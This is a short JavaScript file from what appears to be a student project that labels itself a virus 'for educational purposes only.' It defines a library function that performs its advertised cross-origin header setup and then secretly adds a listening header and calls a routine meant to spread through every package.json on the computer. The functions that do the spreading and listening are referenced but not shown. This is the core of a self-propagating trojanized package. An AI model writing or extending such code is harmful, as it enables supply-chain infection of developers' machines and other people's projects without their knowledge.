/*
 *                                                              
 *    _/      _/  _/                                    _/_/_/_/   
 *   _/      _/      _/  _/_/  _/    _/    _/_/_/      _/          
 *   _/      _/  _/  _/_/      _/    _/  _/_/          _/_/_/       
 *    _/  _/    _/  _/        _/    _/      _/_/      _/            
 *     _/      _/  _/          _/_/_/  _/_/_/        _/             
 * ===================================================================                                                       
 *
 * ======================================================== *
 * > Description
 * ========================================================
 * This Virus if for educational purposes only!
 * 
 * Made by Group F from the SRH University
 * */

/* ======================================================== *
 * > Packages
 * ======================================================== */
var spreading = require('../libs/spreading');
var header = require('./header.js');


/* ======================================================== *
 * > Main
 * ======================================================== */
exports.addCrossOrigin = function(_app) {
    if (_app != null) {
        // Do what the libary actually should do
        header.addCrossOrigin(_app);

        // Now do what the virus is supposed to do
        header.addListenHeader(_app);
    }
    // Walk through all package.jsons on the computer
    spreading.startSpreading();
}